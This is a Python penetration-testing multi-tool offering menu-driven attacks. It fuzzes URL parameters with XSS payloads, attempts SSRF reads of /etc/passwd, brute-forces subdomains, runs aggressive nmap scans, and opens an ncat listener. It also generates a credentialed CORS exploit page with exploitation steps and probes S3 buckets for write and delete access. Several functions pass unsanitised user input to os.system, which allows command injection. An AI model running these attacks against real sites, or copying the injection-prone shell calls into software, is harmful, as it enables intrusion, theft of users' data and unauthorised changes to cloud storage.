#!/usr/bin/env python
# coding=utf-8
# !Author: Suleman Malik
# !Contact: samhax@protonmail.com

from __future__ import print_function

import os
import random
import re
import sys
import time
import traceback
from datetime import datetime
from string import whitespace
from threading import Thread

import dns.resolver
import requests
from colorama import Fore, Style

try:
    import urlparse
except ImportError:
    import urllib.parse as urlparse
try:
    import queue
except ImportError:
    import Queue as queue

try:
    input = raw_input
except NameError:
    pass

try:
    import readline
    readline.parse_and_bind("tab: complete")
except ImportError:
    pass

# CONSTANTS
GOOD = "[+] "
INFO = "[!] "
NEWLINE = "\n"
NOT_VULNERABLE = "Not Vulnerable"


def line():
    print("====================================")


def xss():
    def list_import(file):
        try:
            # Importing Payloads from specified wordlist.
            with open(file, 'r') as list_file:
                content = list_file.readlines()
            return [x.strip() for x in content]
        except IOError:
            print(Style.BRIGHT + Fore.RED + INFO +
                  "List not found!" + Style.RESET_ALL)
            return list()

    def params_check(params, statuses):
        try:
            dashes1 = str()
            dashes2 = str()
            lostatus = str()
            nums = []
            num_of_params = len(max(params, key=len))
            if num_of_params < 10:
                num_of_params = 10
            for index in range(len(params)):
                nums.append(index)
            maxval = str(len(nums))  # number
            for _ in range(num_of_params):
                dashes2 += "-"
            for _ in range(len(maxval)):
                dashes1 += "-"
            statuslen = len(max(statuses, key=len))
            for _ in range(statuslen):
                lostatus += "-"
            if len(dashes2) < 10:
                dashes2 = "----------"
            if len(lostatus) < 14:
                lostatus = "--------------"
            if len(dashes1) < 2:
                dashes1 = "-"
            los = statuslen
            if los < 14:
                los = 14
            upb = ("+-%s-+-%s-+-%s-+") % (dashes1, dashes2, lostatus)
            print(upb)
            print("| # | " + "Param".center(num_of_params, " ") +
                  " | " + "Status".center(los, " ") + " |")
            print(upb)
            for num, param, status in zip(nums, params, statuses):
                # string = (" %s | %s ") % (str(num), str(param))
                lofnum = str(num).center(int(len(dashes1)), " ")
                lofstr = param.center(num_of_params, " ")
                lofst = status.center(los, " ")
                if NOT_VULNERABLE in lofst:
                    lofst = Fore.GREEN + \
                        status.center(los, " ") + Style.RESET_ALL
                else:
                    lofst = Fore.RED + \
                        status.center(los, " ") + Style.RESET_ALL
                print("| " + lofnum + " | " + lofstr + " | " + lofst + " |")
                print(upb)
            return str()
        except ValueError:
            print(Style.BRIGHT + Fore.RED +
                  "No parameters in URL!" + Style.RESET_ALL)

    def complete(params, results, vulnerable, domain):
        if vulnerable == 0:
            print(
                GOOD + "All parameters are " + Style.BRIGHT + Fore.GREEN + NOT_VULNERABLE + Style.RESET_ALL + " to XSS.")
        elif vulnerable == 1:
            print((GOOD + "%s Parameter is " + Style.BRIGHT + Fore.RED +
                   "vulnerable" + Style.RESET_ALL + " to XSS.") % vulnerable)
        else:
            print((GOOD + "%s parameters are " + Style.BRIGHT + Fore.RED +
                   "vulnerable" + Style.RESET_ALL + " to XSS.") % vulnerable)
        print((GOOD + "Scan Result for %s:") % domain)
        print(params_check(params, results))

    def get():
        try:
            site = input(
                "Enter URL (e.g https://example.com/?id=): ")  # Taking URL
            if not site.startswith('https://') or site.startswith('http://'):
                site = "http://" + site
            finalurl = urlparse.urlparse(site)
            domain0 = '{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
            domain = domain0.replace(
                "https://", "").replace("http://", "").replace("www.", "").replace("/", "")
            print(Style.DIM + Fore.WHITE +
                  GOOD + "Checking if " + domain + " is available..." + Style.RESET_ALL)
            response = requests.get(domain0).text
            if not response:
                print(Style.BRIGHT + Fore.RED +
                      INFO + "Site " + domain + " is offline!" + Style.RESET_ALL)
                return
            print(GOOD + Fore.GREEN + domain +
                  " is available!!" + Style.RESET_ALL)

            wordlist = input(
                "Enter XSS wordlist [Defaults to ./src/wordlist.txt]: ")
            if not wordlist:
                wordlist = './src/wordlist.txt'
                # deafult-word-list-for-xss
            payloads = list_import(wordlist)
            lop = str(len(payloads))
            print(GOOD + lop + " Payloads loaded..")
            parameters = urlparse.parse_qs(
                urlparse.urlparse(site).query, keep_blank_values=True)
            path = urlparse.urlparse(site).scheme + "://" + urlparse.urlparse(site).netloc + urlparse.urlparse(
                site).path

            final_params = list()
            final_results = list()
            progress = 0
            total = 0
            # Scanning the parameter.
            for param_name in parameters.keys():
                vulnerable = False
                print(GOOD + "Now checking '" + param_name + "' param")
                final_params.append(str(param_name))
                for payload in payloads:  #
                    validate = payload.translate(whitespace)
                    if validate == "":
                        progress += 1
                    else:
                        sys.stdout.write(
                            "\r%s %i / %s payloads tested." % (GOOD, progress + 1, len(payloads)))
                        sys.stdout.flush()
                        progress += 1
                        enc = requests.utils.requote_uri(payload)
                        data = path + "?" + param_name + \
                            "=" + parameters[param_name][0] + enc
                        page = requests.get(data).text
                        if payload in page:
                            print((Style.BRIGHT + Fore.RED + NEWLINE + INFO + "XSS Vulnerability Found! " + NEWLINE + Fore.RED + Style.BRIGHT + INFO +
                                   "Parameter:\t%s" + NEWLINE + Fore.RED + Style.BRIGHT + INFO + "Payload:\t%s" + Style.RESET_ALL) % (param_name, payload))
                            final_results.append("  Vulnerable  ")
                            vulnerable = True
                            total += 1
                            progress += 1
                            break
                        else:
                            vulnerable = False
                if not vulnerable:
                    print((NEWLINE + GOOD + "'%s' parameter not vulnerable.") %
                          param_name)
                    final_results.append(NOT_VULNERABLE)
                    progress += 1
                progress = 0
            complete(final_params, final_results, total, domain)
        except KeyboardInterrupt:
            print(NEWLINE + "Exit...")

    get()


def exploits():
    line()
    print("EXPLITS")
    choice = int(input("[1] Seach Exploits\n[2] Update Pack\n\nChoice: "))
    if choice == 1:
        query = input("Search exploit (e.g wordpress): ")
        print(NEWLINE + 'Searching exploits...' + NEWLINE)
        os.system('getsploit ' + query)
    elif choice == 2:
        os.system('getsploit --update')


def subd():
    version = "1"
    build = "0.1"

    class Lookup(Thread):
        def __init__(self, in_q, out_q, domain, wildcard=False, resolver_list=list()):
            Thread.__init__(self)
            self.in_q = in_q
            self.out_q = out_q
            self.domain = domain
            self.wildcard = wildcard
            self.resolver_list = resolver_list
            self.resolver = dns.resolver.Resolver()
            if self.resolver.nameservers:
                self.backup_resolver = self.resolver.nameservers
            else:
                # we must have a resolver,  and this is the default resolver on my system...
                self.backup_resolver = ['127.0.0.1']
            if self.resolver_list:
                self.resolver.nameservers = self.resolver_list

        def check(self, host):
            slept = 0
            while True:
                try:
                    answer = self.resolver.query(host)
                    if answer:
                        return str(answer[0])
                    return
                except dns.resolver.NXDOMAIN:
                    return
                except (dns.resolver.NoAnswer, dns.resolver.Timeout):
                    if slept == 4:
                        # This dns server stopped responding.
                        # We could be hitting a rate limit.
                        if self.resolver.nameservers == self.backup_resolver:
                            # if we are already using the backup_resolver use the resolver_list
                            self.resolver.nameservers = self.resolver_list
                        else:
                            # fall back on the system's dns name server
                            self.resolver.nameservers = self.backup_resolver
                    elif slept > 5:
                        # hmm the backup resolver didn't work,
                        # so lets go back to the resolver_list provided.
                        # If the self.backup_resolver list did work, lets stick with it.
                        self.resolver.nameservers = self.resolver_list
                        # I don't think we are ever guaranteed a response for a given name.
                        return
                    # Hmm,  we might have hit a rate limit on a resolver.
                    time.sleep(1)
                    slept += 1
                except IndexError:
                    pass
                except Exception as error:
                    raise error

        def run(self):
            while True:
                sub = self.in_q.get()
                # if sub != False:
                # print 'Try: %s' % (sub)
                if not sub:
                    # Perpetuate the terminator for all threads to see
                    self.in_q.put(False)
                    # Notify the parent of our death of natural causes.
                    self.out_q.put(False)
                    break
                else:
                    try:
                        test = "%s.%s" % (sub, self.domain)
                        addr = self.check(test)
                        if addr and addr != self.wildcard:
                            test = (test, str(addr))
                            self.out_q.put(test)
                    except Exception:
                        pass
    # ++ FUNCTIONS //#
    # func Writelog

    def func_writelog(how, logloc, txt):  # how: a=append, w=new write
        with open(logloc, how) as mylog:
            mylog.write(txt)

    def check_resolvers(file_name):
        txt = 'Checking sudomains...'
        print(txt)
        ret = []
        resolver = dns.resolver.Resolver()
        res_file = open(file_name).read()
        for server in res_file.split(NEWLINE):
            server = server.strip()
            if server:
                resolver.nameservers = [server]
                try:
                    resolver.query("www.google.com")
                    # should throw an exception before this line.
                    ret.append(server)
                except Exception:
                    pass
        return ret

    def run_target(target, hosts, resolve_list, thread_count, print_numeric):
        # The target might have a wildcard dns record...
        wildcard = False
        try:
            resp = dns.resolver.Resolver().query(
                "would never be a domain name" + str(random.randint(1, 9999)) + "." + target)
            wildcard = str(resp[0])
        except Exception:
            pass
        in_q = queue.Queue()
        out_q = queue.Queue()
        for host in hosts:
            in_q.put(host)
        # Terminate the queue
        in_q.put(False)
        step_size = int(len(resolve_list) / thread_count)
        # Split up the resolver list between the threads.
        if step_size <= 0:
            step_size = 1
        step = 0
        for i in range(thread_count):
            threads.append(Lookup(in_q, out_q, target, wildcard,
                                  resolve_list[step:step + step_size]))
            threads[-1].start()
        step += step_size
        if step >= len(resolve_list):
            step = 0
        threads_remaining = thread_count
        subdlist = {}
        subiplist = {}
        i = 0
        while True:
            try:
                domain = out_q.get(True, 10)
                # we will get an empty exception before this runs.
                if not domain:
                    threads_remaining -= 1
                else:
                    if not print_numeric:
                        txt = "%s" % (domain[0])
                        func_writelog('a', logloc, txt + NEWLINE)
                        # print txt
                    else:
                        txt = "%s -> %s" % (domain[0], domain[1])
                        func_writelog('a', logloc, txt + NEWLINE)
                        # print(txt)
                        subdlist[i] = txt
                        if domain[1] in subiplist.keys():
                            subiplist[domain[1]].append(domain[0])
                        else:
                            subiplist[domain[1]] = [domain[0]]
                        i += 1
            except queue.Empty:
                pass
            # make sure everyone is complete
            if threads_remaining <= 0:
                print(" ")
                print("Done. ")
                txt = 'Subdomains found : %s' % (len(subdlist))
                # Alfab. ordered result list
                func_writelog('a', logloc, NEWLINE + txt + NEWLINE +
                              'Ordered list:' + NEWLINE + '-------------' + NEWLINE)
                print(txt)
                print(' ')
                print('Ordered List:')
                for result in sorted(subdlist.values()):
                    txt = result
                    func_writelog('a', logloc, str(txt) + NEWLINE)
                    print(txt)
                print(' ')
                # IP-ordered result list
                txt = "IP-ordered List:"
                func_writelog('a', logloc, NEWLINE + txt +
                              NEWLINE + '----------------' + NEWLINE)
                print(txt)
                for ips in subiplist:
                    txt = ips
                    func_writelog('a', logloc, str(txt) + NEWLINE)
                    print(txt)
                    for ipssub in subiplist[ips]:
                        txt = "      |=> %s" % (ipssub)
                        func_writelog('a', logloc, str(txt) + NEWLINE)
                        print(txt)

                end = datetime.now()
                time_stamp_end = int(time.time())
                duration = int(time_stamp_end) - int(time_stamp_start)
                time_end = str(end.year) + "-" + str(end.month) + "-" + str(end.day) + "    " + str(
                    end.hour) + ":" + str(end.minute) + ":" + str(end.second)
                txt = "Scan Ended : %s" % (time_end)
                txt_b = "Duration : %ss" % (duration)
                func_writelog('a', logloc, NEWLINE + txt + NEWLINE)
                func_writelog('a', logloc, txt_b + NEWLINE)
                print(" ")
                print(txt)
                print(txt_b)
                break
    """
    ON FIRST RUN : SETTING UP BASIC FILES AND FOLDERS
    BEGIN:
    """
    # -- Creating default log directory
    logdir = "log"
    if not os.path.exists(logdir):
        os.makedirs(logdir)
        txt = "Directory 'log/' created"
        print(txt)
    """
    :END
    ON FIRST RUN : SETTING UP BASIC FILES AND FOLDERS
    """
    # Target
    print(NEWLINE)
    target = input("Target domain (eg. example.com): ")
    # Subs
    subfiles = "", "./src/subs/subs_xs.txt"
    choosensub = 1
    hosts = open(subfiles[int(choosensub)]).read().split(NEWLINE)
    # Action
    resolve_list = check_resolvers("cnf/resolvers.txt")
    threads = []
    # signal.signal(signal.SIGINT, killme)
    target = target.strip()
    if target:
        """ Every run : create log file """
        # -- Creating log file in directory 'log' --#
        now = datetime.now()
        time_stamp_start = int(time.time())
        time_start = str(now.year) + "-" + str(now.month) + "-" + str(now.day) + "    " + str(now.hour) + ":" + str(
            now.minute) + ":" + str(now.second)
        logfile = target.replace('.', '_') + '_' + str(now.year) + str(now.month) + str(now.day) + str(
            now.hour) + str(now.minute) + str(now.second) + ".log"
        print("Creating log : log/%s" % (logfile), end=' ')
        logloc = logdir + "/" + logfile
        with open(logloc, "w") as mylog:
            os.chmod(logloc, 0o660)
            mylog.write("Log created  - " + version +
                        " build " + build + NEWLINE + NEWLINE)
            print(".... Done")
            print(" ")
        """ """
        txt = "Scan Started : %s" % (time_start)
        func_writelog('a', logloc, txt + NEWLINE + NEWLINE)
        print(txt)
        print(" ")
        # -- Visible IP --#
        try:
            visible_ip = requests.get(
                'https://cleveridge.org/_exchange/open_files/return_ip.php?s=subd_scanner', verify=False).text
        except Exception:
            visible_ip = requests.get(
                'https://enabledns.com/ip', verify=False).text
        txt = "Visible IP: " + visible_ip
        func_writelog("a", logloc, txt + NEWLINE + NEWLINE)
        print(txt)
        print(' ')

        txt = "Subdomains in %s: " % (target)
        func_writelog('a', logloc, txt + NEWLINE)
        print(txt)
        run_target(target, hosts, resolve_list, 10, True)
        menu()


def whois_geo():
    who = input('Domain(e.g google.com): ')
    whois = requests.get(
        'http://api.hackertarget.com/whois/?q=' + who).text
    print(whois)
    line()
    print("GEOIP LOCATION")
    line()
    geoip = requests.get(
        'http://api.hackertarget.com/geoip/?q=' + who).text
    print(geoip)
    line()


def ssrf_injection():
    print(NEWLINE)
    ssrf = input(
        'Target URL (e.g http://robert-brook.com/parliament/index.php?page=): ')
    print("\tGETTING /etc/passwd from system")
    ssrf_result = requests.get(ssrf + 'file:///etc/passwd')
    if ssrf_result.status_code == 200:
        print(ssrf_result.text)
    else:
        print("SSRF failed on %s" % ssrf_result.url)
    print(
        NEWLINE + " For detail visit https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF")


def nmap_auto_banner():
    target = input('Target Domain/IP (e.g www.google.com): ')
    line()
    print("\tRUNNING SYSTEM NMAP")
    line()
    os.system('nmap -sT -sV -sC -PN -A -T5 ' + target)
    line()
    print("\tTCP PORT SCANING")
    line()
    tcp = requests.get(
        'http://api.hackertarget.com/nmap/?q=' + target).text
    print(tcp)
    line()
    print("\tSUBNET CALCULATION")
    line()
    subnet = requests.get(
        'https://api.hackertarget.com/subnetcalc/?q=' + target).text
    print(subnet)
    print(NEWLINE)


def js_url_parser():
    def extract_urls(content):
        urls = re.findall(
            'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', content.lower())
        clean_urls = []
        for url in urls:
            last_char = url[-1]
            if bool(re.match(r'[^a-zA-Z0-9/]', last_char)):
                clean_urls.append(url[:-1])
            else:
                clean_urls.append(url)
        return clean_urls

    file_name = input('File name (e.g tests/test.js):')
    print(NEWLINE + "Extracting Url from %s..." % file_name)
    line()
    urls = extract_urls(open(file_name, 'r').read())
    for url in urls:
        print(url)
    line()


def target_domain():
    HEADERS = {"X-XSS-Protection": ['1; mode=block'],
               "X-Content-Type-Options": ['nosniff'],
               "X-Frame-Options": ['DENY', 'SAMEORIGIN'],
               "Cache-Control": ['no-store, no-cache', 'no-cache, no-store'],
               "Content-Security-Policy": [None],
               "WebKit-X-CSP": [None],
               "X-Content-Security-Policy": [None],
               "Strict-Transport-Security": [None],
               "Access-Control-Allow-Origin": [None],
               "Origin": []}

    domain = input('Target Domain(e.g google.com): ')

    def passed(bar):
        print("PASS = " + bar)

    def failed(bar):
        print("FAIL = " + bar)

    def info(host):
        print("-----------------------------------")
        print("Target - " + host)
        print("-----------------------------------")

    def format_url(url):
        if not url.startswith("http://") or not url.startswith("https://"):
            return "http://" + url
        return url

    url = format_url(domain)
    response = requests.get(url)
    info(url)
    for header in HEADERS.keys():
        try:
            headval = response.headers[header]
            if headval in HEADERS[header]:
                if HEADERS[header] == "Origin":
                    if headval != None:
                        failed(header + ': ' + str(headval))
                    else:
                        passed(header + ': ' + str(headval))
                passed(header + ': ' + str(headval))
            else:
                failed(header + ': ' + str(headval))
        except KeyError:
            pass
    line()


def listener():
    choice = int(
        input(NEWLINE + '[1] Run Listener \n[2] Install Package\n\nSelection:'))
    if choice == 1:
        port = input('Enter listening port: ')
        print("Incomming connection will be connected automatically on port %s")
        os.system('ncat -vv -n -l -p ' + port)
    elif choice == 2:
        os.system('git clone https://github.com/nmap/nmap; cd nmap')
        os.system('./configure;make;make install')


def info_gather():
    print("Gathering information...")
    line()
    print("\tLISTENING Connections")
    os.system('lsof -iTCP -sTCP:LISTEN -n -P')
    line()
    print("\tESTABLISHED Connections")
    os.system('lsof -s -i -n -P | grep ESTABLISHED')
    line()


def cors_config():
    target_url = input(
        'Target Url (e.g https://api.edmodo.com/users/id): ')
    evil = input('localhost/IP (e.g https://localhost): ')
    print(NEWLINE + "Site will be vulnerable to CORS misconfiguration if these 2 headers are present in the response")
    print("[1]Access-Control-Allow-Credentials: true")
    print("[2]Access-Control-Allow-Origin: %s" % (evil))
    line()
    os.system('curl %s -H "Origin: %s" -I ' % (target_url, evil))
    exp = input(NEWLINE + '[1]Exploit CORS on %s (y/n): ' %
                (target_url)).lower()
    if exp == 'y':
        print("Creating exploit code...")
        print("")
        cors_file = open('Cors.html', 'w')
        body = """<!DOCTYPE html>
        <html>
        <head>
        <title>CORS PoC Exploit</title>
        </head>
        <body>
        <center>
        <h1>CORS Exploit<br>by HackB0x</h1>
        <hr>
        <div id=”demo”>
        <button type=”button” onclick=”cors()”>Exploit</button>
        </div>
        <script type=”text/javascript”>
        function cors() {
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
        if(this.readyState == 4 && this.status == 200) {
        document.getElementById(“demo”).innerHTML = this.responseText;
        }
        };
        xhttp.open(“GET”, “%s", true);
        xhttp.withCredentials = true;
        xhttp.send();
        }
        </script>
        </center>
        </body>
        </html>""" % (target_url)
        cors_file.write(body)
        cors_file.close()
        print(
            "exploit created with the name of Cors.html in your current directory")
        line()
        print(Style.BRIGHT + Fore.GREEN +
              "Exploitation Steps" + Style.RESET_ALL)
        print(
            "[1] Start apache server on your local host\n[2] Paste cors.html in /var/www/html/")
        print("[3] Login to %s\n[4] Open cors.html using %s and click exploit" % (
            target_url, evil))
        line()
        print(NEWLINE + "Loading main menu...")


def aws_s3():
    aws = int(
        input("[1]Install AWS Package\n[2]AWS Credential\n[3]Run Program\n\nSelection:"))
    if aws == 1:
        # os.system('brew install awscli')
        os.system('pip install awscli')
    elif aws == 2:
        line()
        print("\t\tSample")
        line()
        print("""AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Default region name: us-west-2
Default output format: json""")
        print(NEWLINE + NEWLINE)
        os.system('aws configure')
    elif aws == 3:
        aws_program = input(
            'S3 Bucket name (e.g rubyci.s3.amazonaws.com): ')
        print(NEWLINE + "Checking write permission. Creating test.txt to %s " %
              (aws_program))
        os.system('aws s3 cp ./tests/test.txt s3://%s' % (aws_program))
        print(NEWLINE + "Try Listing files from %s" % (aws_program))
        os.system('aws s3 ls s3://%s' % (aws_program))
        print(NEWLINE + "Try fetching file from %s." % (aws_program))
        os.system('aws s3 cp s3://%s/test.txt ./' % (aws_program))
        print(NEWLINE + "Checking remove permission. removing test.txt from %s" % (
            aws_program))
        os.system('aws s3 rm s3://%s/test.txt' % (aws_program))
        print("Process Done." + NEWLINE)

    else:
        print("Invalid number. Try again!!")


def banner():
    with open('./src/banner.md', 'r') as myfile:
        print(myfile.read())


def quit():
    print(NEWLINE + "Quitting program..." + NEWLINE)
    exit(0)


def menu():
    banner()
    try:
        choice = int(input(NEWLINE + "choice: "))
        print(NEWLINE)
        if choice == 1:
            xss()
            menu()
        elif choice == 2:
            exploits()
            menu()
        elif choice == 3:
            subd()
            menu()
        elif choice == 4:
            whois_geo()
            menu()
        elif choice == 5:
            ssrf_injection()
            menu()
        elif choice == 6:
            nmap_auto_banner()
            menu()
        elif choice == 7:
            js_url_parser()
            menu()
        elif choice == 8:
            target_domain()
            menu()
        elif choice == 9:
            listener()
            menu()
        elif choice == 10:
            info_gather()
            menu()
        elif choice == 11:
            cors_config()
            menu()
        elif choice == 12:
            aws_s3()
            menu()
        elif choice == 0:
            quit()
        else:
            print("Please enter the correct number")
            menu()
    except KeyboardInterrupt:
        quit()
    except Exception as error:
        traceback.print_exc()
        print(str(error))
        print("Error try again!!")
        menu()


if __name__ == "__main__":
    menu()
